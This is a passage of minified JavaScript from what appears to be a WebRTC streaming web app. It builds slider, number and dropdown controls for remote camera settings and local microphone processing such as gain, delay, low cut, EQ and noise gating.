videoEle=document.createElement("div");data.trackLabel&&((label=document.createElement("label")).innerText=data.trackLabel,label.style.display="block",label.id="remoteVideoLabel_"+UUID,label.dataset.UUID=UUID,label.classList.add("settingsLabel"),videoEle.appendChild(label));for(var i in data.cameraConstraints)try{if(log(i),log(data.cameraConstraints[i]),"focusMode"===i)continue;if("whiteBalanceMode"===i)continue;if("exposureMode"===i)continue;if("object"==typeof data.cameraConstraints[i]&&null!==data.cameraConstraints[i]&&"max"in data.cameraConstraints[i]&&"min"in data.cameraConstraints[i]){if("aspectRatio"===i);else if("width"===i);else if("height"===i);else if("frameRate"===i);else if("latency"===i);else if("sampleRate"===i)continue;var manualMode=!1,manualLabel=!1;"exposureTime"===i?data.currentCameraConstraints.exposureMode&&((manualMode=document.createElement("input")).type="checkbox",manualMode.id="manual_"+i+"_"+UUID,manualMode.dataset.UUID=UUID,manualMode.dataset.keyname="exposureMode",manualMode.onchange=function(e){var value="manual";e.target.checked&&(value="continuous"),requestVideoHack(e.target.dataset.keyname,value,e.target.dataset.UUID,!0)},(manualLabel=document.createElement("label")).htmlFor=manualMode.id,manualLabel.innerHTML="Auto: ",manualLabel.style.marginLeft="20px","continuous"==data.currentCameraConstraints.exposureMode&&(manualMode.checked=!0)):"focusDistance"===i?data.currentCameraConstraints.focusMode&&((manualMode=document.createElement("input")).type="checkbox",manualMode.id="manual_"+i+"_"+UUID,manualMode.dataset.UUID=UUID,manualMode.dataset.keyname="focusMode",manualMode.onchange=function(e){var value="manual";e.target.checked&&(value="continuous"),requestVideoHack(e.target.dataset.keyname,value,e.target.dataset.UUID,!0)},(manualLabel=document.createElement("label")).htmlFor=manualMode.id,manualLabel.innerHTML="Auto: ",manualLabel.style.marginLeft="20px","continuous"==data.currentCameraConstraints.focusMode&&(manualMode.checked=!0)):"colorTemperature"===i&&data.currentCameraConstraints.whiteBalanceMode&&((manualMode=document.createElement("input")).type="checkbox",manualMode.id="manual_"+i+"_"+UUID,manualMode.dataset.UUID=UUID,manualMode.dataset.keyname="whiteBalanceMode",manualMode.onchange=function(e){var value="manual";e.target.checked&&(value="continuous"),requestVideoHack(e.target.dataset.keyname,value,e.target.dataset.UUID,!0)},(manualLabel=document.createElement("label")).htmlFor=manualMode.id,manualLabel.innerHTML="Auto: ",manualLabel.style.marginLeft="20px","continuous"==data.currentCameraConstraints.whiteBalanceMode&&(manualMode.checked=!0)),(label=document.createElement("label")).htmlFor="constraints_"+i+" _"+UUID,label.innerText="colorTemperature"===i?"Color Temp:":"exposureCompensation"===i?"Exposure Comp:":"exposureTime"===i?"Exposure:":"focusDistance"===i?"Focus:":capitalizeFirstLetter(i).replace(/([a-z])([A-Z])/g,"$1 $2")+":","zoom"!==i&&"pan"!==i&&"til"!==i||(label.innerHTML="<span style='cursor:help;' title='Remote PTZ controls only work if the guest`s window is visible and not minimized'>âš </span> "+label.innerText);var input=document.createElement("input");if("aspectRatio"===i?(input.max=5,input.min=.2,input.step=1e-5):(input.min=data.cameraConstraints[i].min,input.max=data.cameraConstraints[i].max),parseFloat(input.min)==parseFloat(input.max))continue;i in data.currentCameraConstraints&&(input.value=data.currentCameraConstraints[i],label.title="Previously was:  "+data.currentCameraConstraints[i],input.title="Previously was:  "+data.currentCameraConstraints[i]),input.type="range",input.dataset.keyname=i,input.dataset.UUID=UUID,input.id="constraints_"+i+"_"+UUID,input.name=input.id,input.classList.add("inputConstraint"),input.manualMode=manualMode,"height"!==i&&"width"!==i||(input.title="Hold CTRL (or cmd) to lock width and height together when changing them",input.min=16);var preSelectButton,manualInput=document.createElement("input");if(manualInput.type="number",manualInput.value=parseFloat(input.value),manualInput.className="manualInput",manualInput.id="label_"+i+"_"+UUID,manualInput.name=manualInput.id,manualInput.dataset.keyname=i,manualInput.dataset.UUID=UUID,manualInput.manualMode=manualMode,"step"in data.cameraConstraints[i]?(manualInput.step=data.cameraConstraints[i].step,input.step=data.cameraConstraints[i].step):"aspectRatio"===i&&(input.step=1e-6,manualInput.step=.005),manualInput.onchange=function(e){getById("constraints_"+e.target.dataset.keyname+"_"+e.target.dataset.UUID).value=parseFloat(e.target.value),e.target.manualMode?requestVideoHack(e.target.dataset.keyname,e.target.value,e.target.dataset.UUID,!0):requestVideoHack(e.target.dataset.keyname,e.target.value,e.target.dataset.UUID,!1)},input.onchange=function(e){getById("label_"+e.target.dataset.keyname+"_"+e.target.dataset.UUID).value=parseFloat(e.target.value),CtrlPressed||e.target.manualMode?requestVideoHack(e.target.dataset.keyname,e.target.value,e.target.dataset.UUID,!0):requestVideoHack(e.target.dataset.keyname,e.target.value,e.target.dataset.UUID,!1)},input.oninput=function(e){getById("label_"+e.target.dataset.keyname+"_"+e.target.dataset.UUID).value=parseFloat(e.target.value),Date.now()-remoteSliderTimeout>100&&(remoteSliderTimeout=Date.now(),requestVideoHack(e.target.dataset.keyname,e.target.value,e.target.dataset.UUID,!!CtrlPressed))},videoEle.appendChild(label),videoEle.appendChild(manualInput),manualMode&&manualLabel&&(videoEle.appendChild(manualLabel),videoEle.appendChild(manualMode)),"aspectRatio"===i)(preSelectButton=document.createElement("button")).value=16/9,preSelectButton.innerText="16:9",preSelectButton.dataset.keyname=i,preSelectButton.dataset.UUID=UUID,preSelectButton.className="preSelectButton",preSelectButton.onclick=function(e){getById("constraints_"+e.target.dataset.keyname+"_"+e.target.dataset.UUID).value=parseFloat(e.target.value),getById("label_"+e.target.dataset.keyname+"_"+e.target.dataset.UUID).value=parseFloat(e.target.value),requestVideoHack(e.target.dataset.keyname,e.target.value,e.target.dataset.UUID,!1)},videoEle.appendChild(preSelectButton),(preSelectButton=document.createElement("button")).value=9/16,preSelectButton.innerText="9:16",preSelectButton.dataset.UUID=UUID,preSelectButton.className="preSelectButton",preSelectButton.dataset.keyname=i,preSelectButton.onclick=function(e){getById("constraints_"+e.target.dataset.keyname+"_"+e.target.dataset.UUID).value=parseFloat(e.target.value),getById("label_"+e.target.dataset.keyname+"_"+e.target.dataset.UUID).value=parseFloat(e.target.value),requestVideoHack(e.target.dataset.keyname,e.target.value,e.target.dataset.UUID,!1)},videoEle.appendChild(preSelectButton);videoEle.appendChild(input)}else if("object"==typeof data.cameraConstraints[i]&&null!==data.cameraConstraints[i]){if("resizeMode"==i)continue;var div=document.createElement("div");(label=document.createElement("label")).id="label_"+i+"_"+UUID,label.name=label.id,label.htmlFor="constraints_"+i+"_"+UUID,label.innerText=capitalizeFirstLetter(i).replace(/([a-z])([A-Z])/g,"$1 $2")+":",label.style="display:inline-block; padding:0;",label.dataset.keyname=i,label.dataset.UUID=UUID;input=document.createElement("select"),document.createElement("option");if(data.cameraConstraints[i].length>1)for(var opts in data.cameraConstraints[i]){if(log(opts),!1===data.cameraConstraints[i][opts])var opt=new Option("Off",data.cameraConstraints[i][opts]);else if(!0===data.cameraConstraints[i][opts])opt=new Option("On",data.cameraConstraints[i][opts]);else opt=new Option(data.cameraConstraints[i][opts],data.cameraConstraints[i][opts]);input.options.add(opt),i in data.currentCameraConstraints&&data.cameraConstraints[i][opts]==data.currentCameraConstraints[i]&&(opt.selected="true")}else{if("torch"!=i.toLowerCase)continue;opt=new Option("Off",!1);input.options.add(opt),opt=new Option("On",!0),input.options.add(opt);try{i in data.currentCameraConstraints&&1==data.cameraConstraints[i].torch&&(opt.selected="true")}catch(e){}}input.id="constraints_"+i+"_"+UUID,input.className="constraintCameraInput",input.name=input.id,input.dataset.UUID=UUID,input.style="display:inline; padding:2px;",input.dataset.keyname=i,input.dataset.chosen=input.value,input.onchange=function(e){this.dataset.chosen=this.value,requestVideoHack(e.target.dataset.keyname,e.target.value,e.target.dataset.UUID,!!CtrlPressed),log(e.target.dataset.keyname,e.target.value)},videoEle.appendChild(div),div.appendChild(label),div.appendChild(input)}else if("boolean"==typeof data.cameraConstraints[i]){var label;div=document.createElement("div");(label=document.createElement("label")).id="label_"+ +i+"_"+UUID,label.name=label.id,label.htmlFor="constraints_"+ +i+"_"+UUID,label.innerText=capitalizeFirstLetter(i).replace(/([a-z])([A-Z])/g,"$1 $2")+":",label.style="display:inline-block; padding:0;",label.dataset.keyname=i,label.dataset.UUID=UUID;input=document.createElement("select"),document.createElement("option"),opt=new Option("Off",!1);input.options.add(opt),opt=new Option("On",!0),input.options.add(opt);try{!0===data.audioConstraints[i]&&(opt.selected="true")}catch(e){}input.id="constraints_"+ +i+"_"+UUID,input.className="constraintCameraInput",input.name=input.id,input.style="display:inline; padding:2px;",input.dataset.UUID=UUID,input.dataset.keyname=i,input.dataset.chosen=input.value,input.onchange=function(e){this.dataset.chosen=this.value,requestVideoHack(e.target.dataset.keyname,e.target.value,e.target.dataset.UUID,!!CtrlPressed),log(e.target.dataset.keyname,e.target.value)},videoEle.appendChild(div),div.appendChild(label),div.appendChild(input)}}catch(e){errorlog(e)}query("#container_"+UUID+" .advancedVideoSettings").innerHTML="",query("#container_"+UUID+" .advancedVideoSettings").appendChild(videoEle),query("#container_"+UUID+" .advancedVideoSettings").classList.remove("hidden"),fixScrollReset&&(clearTimeout(fixScrollReset),fixScrollReset=null,getById("directorlayout").scrollTop=fixScrollResetValue)}function capitalizeFirstLetter(string){return string.charAt(0).toUpperCase()+string.slice(1)}function listAudioSettings(){getById("popupSelector_constraints_audio").innerHTML="";var tracks=session.streamSrc.getAudioTracks();if(tracks.length)for(var ii=0;ii<tracks.length;ii++){track0=tracks[ii],track0.getCapabilities?session.audioConstraints=track0.getCapabilities():Firefox&&(session.audioConstraints={autoGainControl:[!0,!1],echoCancellation:[!0,!1],noiseSuppression:[!0,!1]});try{if(track0.getSettings)if(session.currentAudioConstraints=track0.getSettings(),session.stereo)session.audioInputChannels&&1==session.audioInputChannels&&(session.currentAudioConstraints.channelCount=1);else try{delete session.currentAudioConstraints.channelCount,delete session.audioConstraints.channelCount}catch(e){}}catch(e){errorlog(e)}if(0==ii)for(var webAudio in session.webAudios)if(session.webAudios[webAudio].gainNode){"none"==getById("popupSelector_constraints_audio").style.display&&(getById("advancedOptionsAudio").style.display="inline-flex");var div=document.createElement("div"),i="masterGain";(label=document.createElement("label")).htmlFor="constraints_"+i,label.innerText=capitalizeFirstLetter(i).replace(/([a-z])([A-Z])/g,"$1 $2")+":",label.style="display:inline-block;",(input=document.createElement("input")).min=0,input.max=200,input.dataset.deviceid=track0.id,input.type="range",input.dataset.keyname=i,input.dataset.labelname=label.innerHTML,input.id="constraints_"+i,input.style="display:block; width:100%;",input.name="constraints_"+i,input.value=100*session.webAudios[webAudio].gainNode.gain.value,input.title=parseInt(input.value),(manualInput=document.createElement("input")).type="number",manualInput.dataset.keyname=i,manualInput.dataset.deviceid=track0.id,manualInput.dataset.labelname=label.innerHTML,manualInput.value=parseFloat(input.value),manualInput.className="manualInput",manualInput.id="label_"+i,manualInput.onchange=function(e){getById("constraints_"+e.target.dataset.keyname).value=parseFloat(e.target.value),changeMainGain(e.target.value),e.target.title=e.target.value,pokeIframeAPI("mic-constraint-changed",{name:e.target.dataset.keyname,value:e.target.value})},input.oninput=function(e){getById("label_"+e.target.dataset.keyname).value=parseFloat(e.target.value),changeMainGain(e.target.value),e.target.title=e.target.value},input.onchange=function(e){getById("label_"+e.target.dataset.keyname).value=parseFloat(e.target.value),changeMainGain(e.target.value),e.target.title=e.target.value,pokeIframeAPI("mic-constraint-changed",{name:e.target.dataset.keyname,value:e.target.value})},getById("popupSelector_constraints_audio").appendChild(div),div.appendChild(label),div.appendChild(manualInput),div.appendChild(input);break}if(!1!==session.micDelay&&0==ii){"none"==getById("popupSelector_constraints_audio").style.display&&(getById("advancedOptionsAudio").style.display="inline-flex");i="micDelay";(label=document.createElement("label")).htmlFor="constraints_"+i,label.innerText=capitalizeFirstLetter(i).replace(/([a-z])([A-Z])/g,"$1 $2")+" (ms):";var input=document.createElement("input");for(var webAudio in input.min=0,input.max=500,input.dataset.deviceid=track0.id,input.type="range",input.dataset.keyname=i,input.dataset.labelname=label.innerHTML,input.id="constraints_"+i,input.style="display:block; width:100%;",input.name="constraints_"+i,session.webAudios)if(session.webAudios[webAudio].micDelay){input.value=1e3*session.webAudios[webAudio].micDelay.delayTime.value,label.innerHTML+=" "+parseInt(1e3*session.webAudios[webAudio].micDelay.delayTime.value),input.title=input.value;break}(manualInput=document.createElement("input")).type="number",manualInput.dataset.keyname=i,manualInput.dataset.labelname=label.innerHTML,manualInput.value=parseFloat(input.value),manualInput.className="manualInput",manualInput.id="label_"+i,manualInput.onchange=function(e){getById("constraints_"+e.target.dataset.keyname).value=parseFloat(e.target.value),changeMicDelay(e.target.value,e.target.dataset.deviceid),e.target.title=e.target.value,pokeIframeAPI("mic-constraint-changed",{name:e.target.dataset.keyname,value:e.target.value})},input.oninput=function(e){getById("label_"+e.target.dataset.keyname).value=parseFloat(e.target.value),changeMicDelay(e.target.value,e.target.dataset.deviceid),e.target.title=e.target.value},input.onchange=function(e){getById("label_"+e.target.dataset.keyname).value=parseFloat(e.target.value),changeMicDelay(e.target.value,e.target.dataset.deviceid),e.target.title=e.target.value,pokeIframeAPI("mic-constraint-changed",{name:e.target.dataset.keyname,value:e.target.value})},getById("popupSelector_constraints_audio").appendChild(label),getById("popupSelector_constraints_audio").appendChild(manualInput),getById("popupSelector_constraints_audio").appendChild(input)}if(session.lowcut&&0==ii){"none"==getById("popupSelector_constraints_audio").style.display&&(getById("advancedOptionsAudio").style.display="inline-flex");i="Low_Cut";(label=document.createElement("label")).htmlFor="constraints_"+i,label.innerText="Low Cut:";input=document.createElement("input");for(var webAudio in input.min=50,input.max=400,input.dataset.deviceid=track0.id,input.type="range",input.dataset.keyname=i,input.dataset.labelname=label.innerHTML,input.id="constraints_"+i,input.style="display:block; width:100%;",input.name="constraints_"+i,session.webAudios)if(session.webAudios[webAudio].lowcut1){input.value=session.webAudios[webAudio].lowcut1.frequency.value,label.innerHTML+=" "+session.webAudios[webAudio].lowcut1.frequency.value,input.title=input.value;break}(manualInput=document.createElement("input")).type="number",manualInput.dataset.keyname=i,manualInput.dataset.labelname=label.innerHTML,manualInput.value=parseFloat(input.value),manualInput.className="manualInput",manualInput.id="label_"+i,manualInput.onchange=function(e){getById("constraints_"+e.target.dataset.keyname).value=parseFloat(e.target.value),changeLowCut(e.target.value,e.target.dataset.deviceid),e.target.title=e.target.value,pokeIframeAPI("mic-constraint-changed",{name:e.target.dataset.keyname,value:e.target.value})},input.oninput=function(e){getById("label_"+e.target.dataset.keyname).value=parseFloat(e.target.value),changeLowCut(e.target.value,e.target.dataset.deviceid),e.target.title=e.target.value},input.onchange=function(e){getById("label_"+e.target.dataset.keyname).value=parseFloat(e.target.value),changeLowCut(e.target.value,e.target.dataset.deviceid),e.target.title=e.target.value,pokeIframeAPI("mic-constraint-changed",{name:e.target.dataset.keyname,value:e.target.value})},getById("popupSelector_constraints_audio").appendChild(label),getById("popupSelector_constraints_audio").appendChild(manualInput),getById("popupSelector_constraints_audio").appendChild(input)}if(session.equalizer&&0==ii){"none"==getById("popupSelector_constraints_audio").style.display&&(getById("advancedOptionsAudio").style.display="inline-flex");i="Low_EQ";(label=document.createElement("label")).htmlFor="constraints_"+i,label.innerHTML="Low EQ:";input=document.createElement("input");for(var webAudio in input.min=-50,input.max=50,input.dataset.deviceid=track0.id,input.type="range",input.dataset.keyname=i,input.dataset.labelname=label.innerHTML,input.id="constraints_"+i,input.style="display:block; width:100%;",input.name="constraints_"+i,session.webAudios)session.webAudios[webAudio].lowEQ&&(input.value=session.webAudios[webAudio].lowEQ.gain.value,label.innerHTML+=" "+session.webAudios[webAudio].lowEQ.gain.value,input.title=input.value);(manualInput=document.createElement("input")).type="number",manualInput.dataset.keyname=i,manualInput.dataset.labelname=label.innerHTML,manualInput.value=parseFloat(input.value),manualInput.className="manualInput",manualInput.id="label_"+i,manualInput.onchange=function(e){getById("constraints_"+e.target.dataset.keyname).value=parseFloat(e.target.value),changeLowEQ(e.target.value,e.target.dataset.deviceid),e.target.title=e.target.value,pokeIframeAPI("mic-constraint-changed",{name:e.target.dataset.keyname,value:e.target.value})},input.oninput=function(e){getById("label_"+e.target.dataset.keyname).value=parseFloat(e.target.value),changeLowEQ(e.target.value,e.target.dataset.deviceid),e.target.title=e.target.value},input.onchange=function(e){getById("label_"+e.target.dataset.keyname).value=parseFloat(e.target.value),changeLowEQ(e.target.value,e.target.dataset.deviceid),e.target.title=e.target.value,pokeIframeAPI("mic-constraint-changed",{name:e.target.dataset.keyname,value:e.target.value})},getById("popupSelector_constraints_audio").appendChild(label),getById("popupSelector_constraints_audio").appendChild(manualInput),getById("popupSelector_constraints_audio").appendChild(input),"none"==getById("popupSelector_constraints_audio").style.display&&(getById("advancedOptionsAudio").style.display="inline-flex");i="Mid_EQ";(label=document.createElement("label")).htmlFor="constraints_"+i,label.innerHTML="Mid EQ:";input=document.createElement("input");for(var webAudio in input.min=-50,input.max=50,input.dataset.deviceid=track0.id,input.type="range",input.dataset.keyname=i,input.dataset.labelname=label.innerHTML,input.id="constraints_"+i,input.style="display:block; width:100%;",input.name="constraints_"+i,session.webAudios)session.webAudios[webAudio].midEQ&&(input.value=session.webAudios[webAudio].midEQ.gain.value,label.innerHTML+=" "+session.webAudios[webAudio].midEQ.gain.value,input.title=input.value);(manualInput=document.createElement("input")).type="number",manualInput.dataset.keyname=i,manualInput.dataset.labelname=label.innerHTML,manualInput.value=parseFloat(input.value),manualInput.className="manualInput",manualInput.id="label_"+i,manualInput.onchange=function(e){getById("constraints_"+e.target.dataset.keyname).value=parseFloat(e.target.value),changeMidEQ(e.target.value,e.target.dataset.deviceid),e.target.title=e.target.value,pokeIframeAPI("mic-constraint-changed",{name:e.target.dataset.keyname,value:e.target.value})},input.oninput=function(e){getById("label_"+e.target.dataset.keyname).value=parseFloat(e.target.value),changeMidEQ(e.target.value,e.target.dataset.deviceid),e.target.title=e.target.value},input.onchange=function(e){getById("label_"+e.target.dataset.keyname).value=parseFloat(e.target.value),changeMidEQ(e.target.value,e.target.dataset.deviceid),e.target.title=e.target.value,pokeIframeAPI("mic-constraint-changed",{name:e.target.dataset.keyname,value:e.target.value})},getById("popupSelector_constraints_audio").appendChild(label),getById("popupSelector_constraints_audio").appendChild(manualInput),getById("popupSelector_constraints_audio").appendChild(input),"none"==getById("popupSelector_constraints_audio").style.display&&(getById("advancedOptionsAudio").style.display="inline-flex");i="High_EQ";(label=document.createElement("label")).htmlFor="constraints_"+i,label.innerHTML="High EQ:";input=document.createElement("input");for(var webAudio in input.min=-50,input.max=50,input.dataset.deviceid=track0.id,input.type="range",input.dataset.keyname=i,input.dataset.labelname=label.innerHTML,input.id="constraints_"+i,input.style="display:block; width:100%;",input.name="constraints_"+i,session.webAudios)session.webAudios[webAudio].highEQ&&(input.value=session.webAudios[webAudio].highEQ.gain.value,label.innerHTML+=" "+session.webAudios[webAudio].highEQ.gain.value,input.title=input.value);(manualInput=document.createElement("input")).type="number",manualInput.dataset.keyname=i,manualInput.dataset.labelname=label.innerHTML,manualInput.value=parseFloat(input.value),manualInput.className="manualInput",manualInput.id="label_"+i,manualInput.onchange=function(e){getById("constraints_"+e.target.dataset.keyname).value=parseFloat(e.target.value),changeHighEQ(e.target.value,e.target.dataset.deviceid),e.target.title=e.target.value,pokeIframeAPI("mic-constraint-changed",{name:e.target.dataset.keyname,value:e.target.value})},input.oninput=function(e){getById("label_"+e.target.dataset.keyname).value=parseFloat(e.target.value),changeHighEQ(e.target.value,e.target.dataset.deviceid),e.target.title=e.target.value},input.onchange=function(e){getById("label_"+e.target.dataset.keyname).value=parseFloat(e.target.value),changeHighEQ(e.target.value,e.target.dataset.deviceid),e.target.title=e.target.value,pokeIframeAPI("mic-constraint-changed",{name:e.target.dataset.keyname,value:e.target.value})},getById("popupSelector_constraints_audio").appendChild(label),getById("popupSelector_constraints_audio").appendChild(manualInput),getById("popupSelector_constraints_audio").appendChild(input)}if(!1!==session.noisegate&&0==ii)for(var webAudio in session.webAudios)if(session.webAudios[webAudio].gatingNode){div=document.createElement("div"),i="noiseGating";(label=document.createElement("label")).id="label_"+i+"_"+ii,label.htmlFor="constraints_"+i+"_"+ii,label.innerText=capitalizeFirstLetter(i).replace(/([a-z])([A-Z])/g,"$1 $2")+":",label.style="display:inline-block;",label.dataset.keyname=i,label.title="This will reduce the gain ~80% when there is no one talking loudly";input=document.createElement("select"),document.createElement("option");input.dataset.deviceid=track0.id;var opt=new Option("Off",!1);input.options.add(opt),opt=new Option("On",!0),session.noisegate&&(opt.selected="true"),input.options.add(opt),"none"==getById("popupSelector_constraints_audio").style.display&&(getById("advancedOptionsAudio").style.display="inline-flex"),input.id="constraints_"+i+"_"+ii,input.className="constraintCameraInput",input.name="constraints_"+i+"_"+ii,input.style="display:inline; padding:2px;",input.dataset.keyname=i,input.dataset.chosen=input.value,input.onchange=function(e){this.dataset.chosen=this.value,"false"==e.target.value?session.noisegate=null:"true"==e.target.value?session.noisegate=!0:session.noisegate=e.target.value,session.noisegate||(changeGatingGain(100),changeGatingGain(100,3100)),pokeIframeAPI("mic-constraint-changed",{name:e.target.dataset.keyname,value:e.target.value})},getById("popupSelector_constraints_audio").appendChild(div),div.appendChild(label),div.appendChild(input);break}if(tracks.length>1)(label=document.createElement("h4")).innerHTML=track0.label,label.style="text-shadow: 0 0 10px #fff3;margin:0px 0 10px 0",ii>0&&(label.style="text-shadow: 0 0 10px #fff3;margin:40px 0 10px 0"),getById("popupSelector_constraints_audio").appendChild(label);for(var i in session.audioConstraints)try{if(log(i),log(session.audioConstraints[i]),"object"==typeof session.audioConstraints[i]&&null!==session.audioConstraints[i]&&"max"in session.audioConstraints[i]&&"min"in session.audioConstraints[i]){if("aspectRatio"===i)continue;if("width"===i)continue;if("height"===i)continue;if("frameRate"===i)continue;if("latency"===i);else if("sampleRate"===i);else if("sampleSize"===i);else if("channelCount"===i){if(!session.stereo||3==session.stereo)continue}else if(!session.disableWebAudio&&"volume"===i)continue;(label=document.createElement("label")).htmlFor="constraints_"+i+"_"+ii,label.innerText=capitalizeFirstLetter(i).replace(/([a-z])([A-Z])/g,"$1 $2")+":",(input=document.createElement("input")).min=session.audioConstraints[i].min,input.max=session.audioConstraints[i].max,input.dataset.deviceid=track0.id,"none"==getById("popupSelector_constraints_audio").style.display&&(getById("advancedOptionsAudio").style.display="inline-flex"),(manualInput=document.createElement("input")).type="number","step"in session.audioConstraints[i]?(input.step=session.audioConstraints[i].step,manualInput.step=session.audioConstraints[i].step):"volume"==i&&(input.step=.01,manualInput.step=.01),i in session.currentAudioConstraints&&(input.value=parseFloat(session.currentAudioConstraints[i]),label.title="Previously was:  "+session.currentAudioConstraints[i],input.title="Previously was:  "+session.currentAudioConstraints[i]),"height"===i||"width"===i?(input.title="Hold CTRL (or cmd) to lock width and height together when changing them",input.min=16):"sampleRate"==i&&(label.title="Audio typically gets resampled to 48-kHz"),input.type="range",input.dataset.keyname=i,input.dataset.track=ii,input.id="constraints_"+i+"_"+ii,input.style="display:block; width:100%;",input.name="constraints_"+i+"_"+ii,manualInput.dataset.keyname=i,manualInput.dataset.track=ii,manualInput.dataset.deviceid=track0.id,manualInput.className="manualInput",manualInput.id="label_"+i+"_"+ii,manualInput.max=session.audioConstraints[i].max,manualInput.min=session.audioConstraints[i].min,manualInput.value=parseFloat(session.currentAudioConstraints[i]),manualInput.onchange=function(e){try{getById("constraints_"+e.target.dataset.keyname+"_"+e.target.dataset.track).value=parseFloat(e.target.value),applyAudioHack(e.target.dataset.keyname,e.target.value,e.target.dataset.deviceid),e.target.title=e.target.value,pokeIframeAPI("mic-constraint-changed",{name:e.target.dataset.keyname,value:e.target.value})}catch(e){errorlog(e)}},input.onchange=function(e){try{getById("label_"+e.target.dataset.keyname+"_"+e.target.dataset.track).value=parseFloat(e.target.value),applyAudioHack(e.target.dataset.keyname,e.target.value,e.target.dataset.deviceid),e.target.title=e.target.value,pokeIframeAPI("mic-constraint-changed",{name:e.target.dataset.keyname,value:e.target.value})}catch(e){errorlog(e)}};div=document.createElement("div");parseFloat(input.min)==parseFloat(input.max)?(manualInput.disabled=!0,manualInput.title="Only one option available, so can't be changed",label.title="Only one option available, so can't be changed",div.appendChild(label),div.appendChild(manualInput),getById("popupSelector_constraints_audio").appendChild(div)):(div.appendChild(label),div.appendChild(manualInput),div.appendChild(input),getById("popupSelector_constraints_audio").appendChild(div))}else if("object"==typeof session.audioConstraints[i]&&null!==session.audioConstraints[i]){if("resizeMode"==i)continue;div=document.createElement("div");(label=document.createElement("label")).id="label_"+i+"_"+ii,label.htmlFor="constraints_"+i+"_"+ii,label.innerText=capitalizeFirstLetter(i).replace(/([a-z])([A-Z])/g,"$1 $2")+":",label.style="display:inline-block;",label.dataset.keyname=i;input=document.createElement("select"),document.createElement("option");if(2==session.audioConstraints[i].length)for(var opts in session.audioConstraints[i]){if(log(opts),!0===session.audioConstraints[i][opts])opt=new Option("On",session.audioConstraints[i][opts]);else if(!1===session.audioConstraints[i][opts])opt=new Option("Off",session.audioConstraints[i][opts]);else opt=new Option(session.audioConstraints[i][opts],session.audioConstraints[i][opts]);input.options.add(opt),i in session.currentAudioConstraints&&session.audioConstraints[i][opts]==session.currentAudioConstraints[i]&&(opt.selected="true")}else if(session.audioConstraints[i].length>1)for(var opts in session.audioConstraints[i]){log(opts);opt=new Option(session.audioConstraints[i][opts],session.audioConstraints[i][opts]);input.options.add(opt),i in session.currentAudioConstraints&&session.audioConstraints[i][opts]==session.currentAudioConstraints[i]&&(opt.selected="true")}else{if("torch"!=i.toLowerCase)continue;opt=new Option("Off",!1);input.options.add(opt),opt=new Option("On",!0),input.options.add(opt)}"none"==getById("popupSelector_constraints_audio").style.display&&(getById("advancedOptionsAudio").style.display="inline-flex"),input.id="constraints_"+i+"_"+ii,input.className="constraintCameraInput",input.name="constraints_"+i+"_"+ii,input.dataset.deviceid=track0.id,input.style="display:inline; padding:2px;",input.dataset.keyname=i,input.dataset.chosen=input.value,input.onchange=function(e){this.dataset.chosen=this.value,applyAudioHack(e.target.dataset.keyname,e.target.value,e.target.dataset.deviceid),pokeIframeAPI("mic-constraint-changed",{name:e.target.dataset.keyname,value:e.target.value})},getById("popupSelector_constraints_audio").appendChild(div),div.appendChild(label),div.appendChild(input)}else if("boolean"==typeof session.audioConstraints[i]){div=document.createElement("div");(label=document.createElement("label")).id="label_"+i+"_"+ii,label.htmlFor="constraints_"+i+"_"+ii,label.innerText=capitalizeFirstLetter(i).replace(/([a-z])([A-Z])/g,"$1 $2")+":",label.style="display:inline-block;",label.dataset.keyname=i;input=document.createElement("select"),document.createElement("option");input.dataset.deviceid=track0.id;opt=new Option("Off",!1);input.options.add(opt),opt=new Option("On",!0),input.options.add(opt),"none"==getById("popupSelector_constraints_audio").style.display&&(getById("advancedOptionsAudio").style.display="inline-flex"),input.id="constraints_"+i+"_"+ii,input.className="constraintCameraInput",input.name="constraints_"+i+"_"+ii,input.style="display:inline; padding:2px;",input.dataset.keyname=i,input.dataset.chosen=input.value,input.onchange=function(e){this.dataset.chosen=this.value,applyAudioHack(e.target.dataset.keyname,e.target.value,e.target.dataset.deviceid),pokeIframeAPI("mic-constraint-changed",{name:e.target.dataset.keyname,value:e.target.value})},getById("popupSelector_constraints_audio").appendChild(div),div.appendChild(label),div.appendChild(input)}}catch(e){errorlog(e)}if(tracks.length>1)for(var webAudio in session.webAudios)if(session.webAudios[webAudio].subGainNodes&&track0.id in session.webAudios[webAudio].subGainNodes){"none"==getById("popupSelector_constraints_audio").style.display&&(getById("advancedOptionsAudio").style.display="inline-flex");var label,manualInput;div=document.createElement("div"),i="Gain";(label=document.createElement("label")).id="label_"+i+"_"+track0.id,label.htmlFor="constraints_"+i+"_"+track0.id,label.innerText="Gain:",label.style="display:inline-block; padding:0;margin-top: 15px",(input=document.createElement("input")).min=0,input.max=200,input.dataset.deviceid=track0.id,input.type="range",input.dataset.keyname=i,input.dataset.labelname=label.innerHTML,input.id="constraints_"+i+"_"+track0.id,input.style="display:block; width:100%;",input.name="constraints_"+i+"_"+track0.id,input.value=100*session.webAudios[webAudio].subGainNodes[track0.id].gain.value,label.innerText+=" "+parseInt(100*session.webAudios[webAudio].subGainNodes[track0.id].gain.value),input.title=parseInt(input.value),(manualInput=document.createElement("input")).type="number",manualInput.dataset.keyname=i,manualInput.dataset.deviceid=track0.id,manualInput.dataset.labelname=label.innerHTML,manualInput.value=parseFloat(input.value),manualInput.className="manualInput",manualInput.id="manualInput_"+i+"_"+track0.id,manualInput.onchange=function(e){getById("constraints_"+e.target.dataset.keyname+"_"+e.target.dataset.deviceid).value=parseFloat(e.target.value),getById("label_"+e.target.dataset.keyname+"_"+e.target.dataset.deviceid).innerText="Gain: "+parseInt(e.target.value),getById("manualInput_"+e.target.dataset.keyname+"_"+e.target.dataset.deviceid).value=parseFloat(e.target.value),changeSubGain(e.target.value,e.target.dataset.deviceid),e.target.title=e.target.value,pokeIframeAPI("mic-constraint-changed",{name:e.target.dataset.keyname,value:e.target.value})},input.oninput=function(e){getById("label_"+e.target.dataset.keyname+"_"+e.target.dataset.deviceid).innerText="Gain: "+parseInt(e.target.value),getById("manualInput_"+e.target.dataset.keyname+"_"+e.target.dataset.deviceid).value=parseFloat(e.target.value),changeSubGain(e.target.value,e.target.dataset.deviceid),e.target.title=e.target.value},input.onchange=function(e){getById("label_"+e.target.dataset.keyname+"_"+e.target.dataset.deviceid).innerText="Gain: 